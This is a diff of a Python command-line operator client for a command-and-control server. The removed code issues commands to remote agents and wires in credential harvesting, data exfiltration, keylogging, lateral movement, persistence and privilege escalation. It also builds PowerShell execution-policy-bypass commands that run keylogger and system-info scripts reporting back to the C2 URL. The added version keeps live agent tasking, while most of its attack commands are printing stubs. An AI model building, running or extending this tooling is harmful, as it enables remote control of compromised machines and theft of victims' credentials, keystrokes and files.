@@ -8,182 +8,123 @@
 # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 ######################################################################################################################################################################################################################
 
-import typer
 import requests
-import os
-import sys
-import subprocess
 import json
-from typing import Optional
-import time
+import typer
+import os
 
-# Ensure the 'modules' directory is in the Python path
-sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
+app = typer.Typer()
 
-from modules import credential_harvesting
-from modules import exfiltration
-from modules import keylogging
-from modules import lateral_movement
-from modules import persistence
-from modules import privilege_escalation
-from modules import reconnaissance
+C2_URL = "http://10.0.2.4:8080"
+SELECTED_AGENT_FILE = "selected_agent.txt"
 
-cli = typer.Typer()
+def save_selected_agent(agent_id: str):
+    with open(SELECTED_AGENT_FILE, "w") as f:
+        f.write(agent_id)
 
-C2_URL = "http://127.0.0.1:8000"
+def load_selected_agent():
+    if os.path.exists(SELECTED_AGENT_FILE):
+        with open(SELECTED_AGENT_FILE, "r") as f:
+            return f.read().strip()
+    return None
 
-def pretty_print_json(data):
-    """Pretty print JSON data."""
-    formatted_json = json.dumps(data, indent=4, sort_keys=True)
-    typer.echo(formatted_json)
+@app.command()
+def list_agents():
+    response = requests.get(f"{C2_URL}/list_agents")
+    agents = response.json().get("agents", [])
+    for agent in agents:
+        print(agent["AgentID"])
 
-def log_result(agent_id: str, result: str):
-    """Log result to a file for tracking."""
-    with open("result_log.txt", "a") as f:
-        f.write(f"Agent {agent_id} Result: {result}\n")
+@app.command()
+def select_agent(agent_id: str):
+    save_selected_agent(agent_id)
+    print(f"Selected agent: {agent_id}")
 
-@cli.command("list-agents")
-def list_agents_cli():
-    """List all registered agents."""
-    try:
-        response = requests.get(f"{C2_URL}/list_agents")
-        response.raise_for_status()
-        agents = response.json().get("agents", [])
-        if agents:
-            typer.echo("Registered Agents:")
-            pretty_print_json(agents)
-        else:
-            typer.echo("No registered agents found.")
-    except requests.RequestException as e:
-        typer.echo(f"Failed to list agents: {e}")
-
-@cli.command("send-command")
-def send_command(agent_id: str, command: str):
-    """Send a command to a specific agent and retry until the result is available."""
+@app.command()
+def send_command(command: str, agent_id: str = typer.Option(None, help="Agent ID to send the command to")):
+    if not agent_id:
+        agent_id = load_selected_agent()
+        if not agent_id:
+            print("No agent selected. Please specify an agent ID or select an agent first.")
+            return
+    
     payload = {
         "AgentID": agent_id,
         "Command": command
     }
-    try:
-        # Send the command
-        response = requests.post(f"{C2_URL}/sendcommand", json=payload)
-        response.raise_for_status()
-        typer.echo(f"Command sent to agent {agent_id}.")
-
-        # Wait for 30 seconds before fetching result (adjust as necessary)
-        time.sleep(30)
-
-        # Check for result and retry up to 3 times if not available
-        retry_attempts = 3
-        for attempt in range(retry_attempts):
-            fetch_result(agent_id)
-            time.sleep(10)  # Wait 10 seconds before the next retry
-    except requests.RequestException as e:
-        typer.echo(f"Failed to send command: {e}")
-
-def fetch_result(agent_id: str):
-    """Fetch the result of a command from the agent."""
-    try:
-        response = requests.get(f"{C2_URL}/result", params={"agent_id": agent_id})
-        response.raise_for_status()
-        result = response.json().get("Result", "No result available")
-        typer.echo(f"Result from agent {agent_id}:")
-        pretty_print_json(result)
-        log_result(agent_id, result)  # Log the result to a file
-    except requests.RequestException as e:
-        typer.echo(f"Failed to fetch result: {e}")
-
-@cli.command("generate-payload")
-def generate_payload(platform: str):
-    """Generate an obfuscated payload for a specific platform."""
-    typer.echo(f"Generating payload for {platform}...")
-
-@cli.command("harvest-credentials")
-def harvest_credentials():
-    credentials = credential_harvesting.harvest_credentials()
-    typer.echo("Credentials harvested:")
-    for cred in credentials:
-        pretty_print_json(cred)
-    credential_harvesting.send_to_c2_server(credentials)
-
-@cli.command("establish-persistence")
-def establish_persistence():
-    persistence.establish_persistence()
-    typer.echo("Persistence established.")
-
-@cli.command("escalate-privileges")
-def escalate_privileges():
-    privilege_escalation.escalate_privileges()
-    typer.echo("Privilege escalation attempted.")
-
-@cli.command("gather-system-info")
-def gather_system_info(agent_id: str):
-    script_path = os.path.join(os.path.dirname(__file__), '..', 'modules', 'windows', 'gather_system_info.ps1')
-    command = f"powershell -ExecutionPolicy Bypass -File {script_path} -C2Url {C2_URL}/receive_system_info -AgentID {agent_id}"
-    send_command(agent_id, command)
-
-@cli.command("exfiltrate-data")
-def exfiltrate_data(file_path: str):
-    status_code = exfiltration.exfiltrate_data(file_path, C2_URL)
-    typer.echo(f"Data exfiltration status: {status_code}")
-
-@cli.command("start-keylogger")
-def start_keylogger(agent_id: str):
-    """Start a keylogger and send logs to the C2 server."""
-    script_path = os.path.join(os.path.dirname(__file__), '..', 'modules', 'windows', 'keylogging.ps1')
-    command = f"powershell -ExecutionPolicy Bypass -File {script_path} -C2Url {C2_URL}/receive_keystrokes -AgentID {agent_id}"
-    send_command(agent_id, command)
-
-@cli.command("move-laterally")
-def move_laterally(target_ip: str, username: str, password: str):
-    """Attempt lateral movement to the target IP using the provided credentials."""
-    lateral_movement.move_laterally(target_ip, username, password)
-    typer.echo(f"Attempted lateral movement to {target_ip}")
-
-@cli.command("deploy-payload")
-def deploy_payload(agent_type: str):
-    project_root = os.path.dirname(os.path.abspath(__file__))
-    payload_dir = os.path.join(project_root, "..", "payloads")
-
-    if agent_type == "macos":
-        subprocess.run([os.path.join(payload_dir, "macos_payload.sh")])
-    elif agent_type == "linux":
-        subprocess.run([os.path.join(payload_dir, "linux_payload.sh")])
-    elif agent_type == "windows":
-        subprocess.run(["powershell.exe", os.path.join(payload_dir, "windows_payload.ps1")])
+    response = requests.post(f"{C2_URL}/sendcommand", json=payload)
+    if response.status_code == 200:
+        print(f"Command sent to agent {agent_id}: {command}")
     else:
-        typer.echo("Unknown agent type. Please specify 'macos', 'linux', or 'windows'.")
+        print(f"Failed to send command to agent {agent_id}: {response.text}")
 
-@cli.command("select-agent")
-def select_agent(agent: Optional[str] = typer.Argument(None, help="The ID of the agent")):
-    if agent is None:
-        response = requests.get(f"{C2_URL}/list_agents")
-        agents = response.json().get("agents", [])
-        agent_ids = [agent['AgentID'] for agent in agents]
-        if not agent_ids:
-            typer.echo("No agents available.")
+@app.command()
+def get_result(agent_id: str = typer.Option(None, help="Agent ID to get the result from")):
+    if not agent_id:
+        agent_id = load_selected_agent()
+        if not agent_id:
+            print("No agent selected. Please specify an agent ID or select an agent first.")
             return
 
-        agent_id = typer.prompt("Select an agent", type=typer.Choice(agent_ids))
+    response = requests.get(f"{C2_URL}/result", params={"agent_id": agent_id})
+    if response.status_code == 200:
+        result = response.json().get("Result")
+        print(f"Result from agent {agent_id}: {result}")
     else:
-        agent_id = agent
+        print(f"Failed to get result from agent {agent_id}: {response.text}")
 
-    while True:
-        command = typer.prompt(f"Enter command to send to agent {agent_id} (or 'exit' to stop)")
-        if command.lower() == "exit":
-            break
-        response = requests.post(f"{C2_URL}/sendcommand", json={"AgentID": agent_id, "Command": command})
-        response.raise_for_status()
-        typer.echo(f"Command '{command}' sent to agent {agent_id}")
+@app.command()
+def generate_payload(platform: str):
+    print(f"Generating obfuscated payload for platform: {platform}")
+    # Implement the logic to generate the payload
 
-        time.sleep(30)
-        fetch_result(agent_id)
+@app.command()
+def harvest_credentials():
+    print("Harvesting credentials")
+    # Implement the logic to harvest credentials
 
-@cli.command("generate-report")
-def generate_report():
-    with open('c2_server.log', 'r') as log_file, open('report.txt', 'w') as report_file:
-        report_file.write(log_file.read())
-    typer.echo("Report generated as report.txt")
+@app.command()
+def establish_persistence():
+    print("Establishing persistence")
+    # Implement the logic to establish persistence
+
+@app.command()
+def escalate_privileges():
+    print("Escalating privileges")
+    # Implement the logic to escalate privileges
+
+@app.command()
+def gather_system_info(agent_id: str = typer.Option(None, help="Agent ID to gather system information from")):
+    if not agent_id:
+        agent_id = load_selected_agent()
+        if not agent_id:
+            print("No agent selected. Please specify an agent ID or select an agent first.")
+            return
+
+    print(f"Gathering system information from agent {agent_id}")
+    # Implement the logic to gather system information
+
+@app.command()
+def exfiltrate_data(file_path: str):
+    print(f"Exfiltrating data from file: {file_path}")
+    # Implement the logic to exfiltrate data
+
+@app.command()
+def start_keylogger(agent_id: str = typer.Option(None, help="Agent ID to start the keylogger on")):
+    if not agent_id:
+        agent_id = load_selected_agent()
+        if not agent_id:
+            print("No agent selected. Please specify an agent ID or select an agent first.")
+            return
+
+    print(f"Starting keylogger on agent {agent_id}")
+    # Implement the logic to start the keylogger
+
+@app.command()
+def move_laterally(target_ip: str, username: str, password: str):
+    print(f"Moving laterally to target IP: {target_ip} with username: {username} and password: {password}")
+    # Implement the logic to move laterally
 
 if __name__ == "__main__":
-    cli()
+    app()
+
